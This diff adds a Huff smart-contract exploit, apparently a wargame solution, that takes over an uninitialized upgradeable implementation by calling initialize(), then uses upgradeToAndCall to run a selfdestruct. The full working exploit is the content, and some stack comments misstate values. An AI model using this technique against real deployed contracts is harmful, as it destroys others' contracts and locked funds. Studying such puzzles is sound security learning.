@@ -1,0 +1,197 @@
+// Storage 
+#define constant OWNER_SLOT = FREE_STORAGE_POINTER()
+#define constant INSTANCE_SLOT = FREE_STORAGE_POINTER()
+
+// Constructor
+#define macro CONSTRUCTOR() = takes (0) returns (0) {
+    // Copy caller into OWNER_SLOT in storage
+    caller          // [msg.sender] - msg.sender
+    [OWNER_SLOT]    // [0x00, msg.sender] OWNER_SLOT is the 0th slot in storage
+    sstore          // [] - sstore consumes top 2 stack items. The first item is
+                    // the key (storage location) and the second item is the value (item to store)
+
+    // Copy constructor argument (address) into memory
+    0x20            // [0x20] - This will be the size for the the code we will copy to memory
+    dup1            // [0x20, 0x20] - This will be used to calculate offset for which we will copy code from current environment
+    codesize        // [code_size, 0x20, 0x20] - codesize pushes the size of code in current environment on to stack
+    sub             // [offset, 0x20] - sub consumes top two items off stack and subtracts item 1 from item 2. Used to calculate offset for codecopy
+    returndatasize  // [0x00, offset, 0x20] - 0x00 is the destination offset in memory for the code we will copy
+    codecopy        // [] - codecopy consumes top 3 items off stack. codecopy(destOffset, offset, size)
+
+    // Copy address from memory into INSTANCE_SLOT in storage
+    returndatasize  // [0x00] - This is the offset in memory for which to copy 32 bytes from (our address param) 
+    mload           // [address_param] - mload consumes top item off stack and pushes 32 bytes from that offset in memory onto stack => mload(offset)
+    [INSTANCE_SLOT] // [0x01, address_param] - INSTANCE_SLOT is the 1st storage slot where we will store address_param
+    sstore          // [] - sstore consumes top two items off stack. sstore(key, value)
+}
+
+// Modifier
+#define macro ONLY_OWNER() = takes (0) returns (0) {
+    caller          // [caller]
+    [OWNER_SLOT]    // [0x00, caller] - storage slot where owner is stored
+    sload           // [owner, caller] - loaded owner address onto stack from storage slot 0x00
+    eq              // [0/1] - consumes top two items and returns 1 if equal, 0 otherwise
+    is_owner        // [is_owner_label, 0/1] - byte offset in code for execution path
+    jumpi           // [] - consumes top two items and execution path jumps to is_owner_label if 2nd item is not 0
+
+    0x00            // [0x00] - size
+    0x00            // [0x00, 0x00] - byte offset
+    revert          // [] - reverts with data of size 0x00, starting from byte offset 0x00 in memory (reverts with no data)
+
+    is_owner:       // is_owner label. execution continues here is the caller is the owner
+}
+
+// Attack function
+#define macro ATTACK() = takes(0) returns (0) {
+    // Copy `initialize()` func sig into memory to use as calldata for CALL
+    0x8129fc1c      // [0x8129fc1c] - func sig for `initialize()`
+    0x00            // [0x00, 0x8129fc1c] - byte offset
+    mstore          // [] - copied func sig into memory starting at offset 0x00
+
+    // MEMORY:
+    // [OFFSET 0]  000000000000000000000000000000000000000000000000000000008129fc1c -> `initialize()` func sig
+
+    // CAll into instance 
+    [INSTANCE_SLOT] // [0x01] - storage slot where instance address is
+    sload           // [instance] - copied instance onto stack from storage slot 0x01
+    0x00            // [0x00, instance] - size of return data (none)
+    0x00            // [0x00, 0x00, instance] - byte offset in memory where return data is copied
+    0x04            // [0x04, 0x00, 0x00, instance] - size of calldata
+    0x1c            // [0x1c, 0x04, 0x00, 0x00, instance] - byte offset in memory where calldata starts
+    0x00            // [value, 0x1c, 0x04, 0x00, 0x00, instance] - msg.value to send with call (none)
+    dup6            // [instance, value, 0x1c, 0x04, 0x00, 0x00, instance] - calling instance
+    gas             // [gas, instance, value, 0x1c, 0x04, 0x00, 0x00, instance] - gas to send with call (gasleft())
+    call            // [success, instance] - consumes top 6 items and pushes 1 onto stack if call did not revert, 0 otherwise
+    iszero          // [0/1, instance]
+    throw_error     // [throw_error, 0/1, instance]
+    jumpi           // [instance]
+
+    // Copy `upgrader()` func sig into memory to use as calldata for STATICCALL
+    0xaf269745      // [0xaf269745, instance] - func sig for `upgrader()`
+    0x00            // [0x00, 0xaf269745, instance] - byte offset
+    mstore          // [instance] - copied func sig into memory starting from byte offset 0x20
+
+    // MEMORY:
+    // [OFFSET 0]  00000000000000000000000000000000000000000000000000000000af269745 -> `upgrader()` func sig
+
+    // STATICCALL into instance
+    0x20            // [0x20, instance] - size of return data
+    0x20            // [0x20, 0x20, instance] - byte offset where return data is copied
+    0x04            // [0x04, 0x20, 0x20, instance] - size of calldata
+    0x1c            // [0x1c, 0x04, 0x20, 0x20, instance] - byte offset where calldata starts
+    dup5            // [instance, 0x1c, 0x04, 0x20, 0x20, instance] - calling instance
+    gas             // [gas, instance, 0x1c, 0x04, 0x20, 0x20, instance] - gas to send with call (gasleft())
+    staticcall      // [success, instance] - consumes 6 top items and pushes 1 if call succeeded, 0 otherwise
+    iszero          // [0/1, instance]
+    throw_error     // [throw_error, 0/1, instance]
+    jumpi           // [instance]
+
+    // MEMORY:
+    // [OFFSET 0]  00000000000000000000000000000000000000000000000000000000af269745 -> `upgrader()` func sig
+    // [OFFSET 32] 000000000000000000000000006c992966be10e1da52fb2b09a62a1059c093bf -> return data (address)
+
+    // Check return data and verify that it is equal to self
+    0x20            // [0x20, instance] - byte offset
+    mload           // [return_data, instance] - copied return data onto stack
+    address         // [self, return_data, instance] - self
+    xor             // [xor_value, instance] - consumes top two items and performs xor operation. Pushes 0 if items are equal
+    throw_error     // [throw_error, xor_value, instance]
+    jumpi           // [instance]
+
+    // Copy `upgradeToAndCall(address,bytes)` into memory to use as calldata for CALL
+    0x4f1ef286      // [0x4f1ef286, instance] - func sig for `upgradeToAndCall(address,bytes)`
+    0x00            // [0x00, 0x4f1ef286, instance] - byte offset
+    mstore          // [instance] - copied func sig into memory starting at offset 0x00
+
+    // Copy `explode()` func sig into memory to use as 2nd param in calldata
+    // type is bytes (dynamic) so we need to build the calldata !!!!!!!!
+    // check out this article if you would like more info: https://degatchi.com/articles/reading-raw-evm-calldata
+    0x40            // [0x20, instance] - byte offset for bytes calldata
+    0x40            // [0x40, 0x20, instance] - byte offset in memory where 0x20 will be copied
+    mstore          // [instance] - copied 0x20 into memory starting at byte offset 0x40
+    0x04            // [0x04, instance] - size of bytes-calldata
+    0x60            // [0x60, 0x04, instance] - byte offset in memory where 0x04 will be copied
+    mstore          // [instance] - copied 0x04 into memory starting at byte offset 0x60
+    __RIGHTPAD(0xb8b3dbc6) // [0xb8b3dbc6_, instance] - func sig right-padded (actual bytes-calldata value)
+    0x80            // [0x80, 0xb8b3dbc6_, instance] - byte offset in memory where func sig will be copied
+    mstore          // [instance] - copied func sig into memory starting at byte offset 0x80
+
+    // MEMORY:
+    // [OFFSET 0]   000000000000000000000000000000000000000000000000000000004f1ef286 -> `upgradeToAndCall(address,bytes)` func sig
+    // [OFFSET 32]  000000000000000000000000006c992966be10e1da52fb2b09a62a1059c093bf -> return data (self)
+    // [OFFSET 64]  0000000000000000000000000000000000000000000000000000000000000020 -> byte offset for bytes param
+    // [OFFSET 96]  0000000000000000000000000000000000000000000000000000000000000004 -> size of byte param
+    // [OFFSET 128] b8b3dbc600000000000000000000000000000000000000000000000000000000 -> byte param value 
+
+    // CALL into instance
+    0x00            // [0x00, instance] - size of return data
+    0x00            // [0x00, 0x00, instance] - byte offset where return data is copied
+    0x84            // [0x28, 0x00, 0x00, instance] - size of calldata
+    0x1c            // [0x1c, 0x28, 0x00, 0x00, instance] - byte offset where calldata starts
+    0x00            // [value, 0x1c, 0x28, 0x00, 0x00, instance] - msg.value to send with call (none)
+    dup6            // [instance, value, 0x1c, 0x28, 0x00, 0x00, instance] - calling instance
+    gas             // [gas, instance, value, 0x1c, 0x28, 0x00, 0x00, instance] - gas to send with call (gasleft())
+    call            // [success, instance] - consumes 7 items off stack and pushes 1 if call did not revert, 0 otherwise
+    iszero          // [0/1, instance]
+    throw_error     // [throw_error, 0/1, instance]
+    jumpi           // [instance]
+    pop             // []
+
+    stop
+}
+
+// Explode function
+#define macro EXPLODE() = takes (0) returns (0) {
+    // I don't believe Huff has support for immutables so instead of checking that the origin is our user address I am checking that the upgrader 
+    // (which SHOULD be us) is calling our explode function.
+
+    caller          // [msg.sender]
+    0x00            // [0x00, msg.sender] - storage slot where upgrader address is stored
+    sload           // [upgrader, msg.sender] - copied upgrader from storage slot 0x00 onto stack. Note: this is a delegate call so storage belongs to caller (Engine)
+    0x10            // [0x10, upgrader msg.sender] - need to shave off 2 extra bytes (16 bits) at the end of upgrader address "0001". Not quite sure why they're there ?
+    shr             // [_upgrader, msg.sender] - shifted upgrader 16 bits to right
+                    // 0x00000000000000000000d8ef884daf8d44aea036b70a4790ed1ec836a6b20001
+                    // 0x000000000000000000000000d8ef884daf8d44aea036b70a4790ed1ec836a6b2 
+    eq              // [0/1] - comparing upgrader and msg.sender to ensure they are equal
+    destroy         // [destory, 0/1] - destroy label
+    jumpi           // [] - jump to destory instructions if they are equal
+    0x00            // [0x00] - size of data to return on revert
+    0x00            // [0x00, 0x00] - offset in memory for data to return on revert
+    revert          // []
+
+    destroy:          // label for destroy instructions
+        0x00          // [0x00] - 0 address
+        selfdestruct  // [] - selfdestruct and send balance to 0 address
+}
+
+// Function Dispatching
+#define macro MAIN() = takes (0) returns (0) {
+    // Identify which function is being called
+    0x00         // [0x00] - the byte offset in calldata that we will read 32 bytes from
+    calldataload // [calldata] - calldataload consumes top item from stack and pushes 32 bytes of calldata, from byte offset, onto stack
+    0xe0         // [0xe0, calldata] - 0xe0 is 224 bits
+    shr          // [func_sig] - shr consumes top two items off the stack, performs a logical right shift and pushes resulting value of stack
+                 // Here we are shifting the calldata 224 bits to the right (256 - 224 = 32 bits = 4 bytes) and isolating the first 4 bytes (function sig)
+    dup1         // [func_sig, func_sig]
+    0x9e5faafc   // [0x9e5faafc, func_sig, func_sig] - pushing func sig of 'attack()' onto the stack
+    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
+    attack       // [attack_label, 0/1, func_sig] - attack_label is a label (byte offset) for the attack instructions
+    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path
+
+    dup1         // [func_sig, func_sig]
+    0xb8b3dbc6   // [0xb8b3dbc6, func_sig, func_sig] - pushing func sig of 'explode()' onto the stack
+    eq           // [0/1, func_sig] - eq consumes top two items from stack and pushes 1 onto stack if they are equal, otherwise 0
+    explode      // [explode, 0/1, func_sig] - explode is a label (byte offset) for the explode instructions
+    jumpi        // [func_sig] = jumpi consumes top two items from stack and jumps to new execution path if second item is not 0, otherwise executions continues on current path
+
+
+    throw_error: // label for revert path
+        0x00 0x00 revert
+
+    attack:      // label for attack instructions
+        ONLY_OWNER()
+        ATTACK()
+
+    explode:     // label for explode instructions
+        EXPLODE()
+}
